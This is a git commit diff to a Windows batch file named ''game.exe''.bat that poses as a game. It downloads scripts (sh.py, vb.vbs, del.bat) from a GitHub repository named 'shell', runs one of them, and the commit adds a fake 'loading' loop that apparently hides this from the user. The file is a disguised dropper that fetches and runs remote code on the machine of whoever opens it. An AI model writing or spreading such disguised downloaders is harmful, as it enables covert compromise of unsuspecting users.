8c73184761f1ccf0f659600b7581ae7f0bf64207
Omar Samy <osamy7592@gmail.com>
2024-05-01 14:51:28 +0300

    Update 'game.exe'.bat

--- 'game.exe'.bat
+++ 'game.exe'.bat
@@ -4,4 +4,7 @@ curl https://raw.githubusercontent.com/omarsamyX0/shell/main/sh.py -o  D:\sh.py
 curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb.vbs -o  D:\vb.vbs
 curl https://raw.githubusercontent.com/omarsamyX0/shell/main/del.bat -o  D:\del.bat
 call D:\vb.vbs
+for %%i in (1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20) do (
+    echo %% loading ...........
+)
 exit
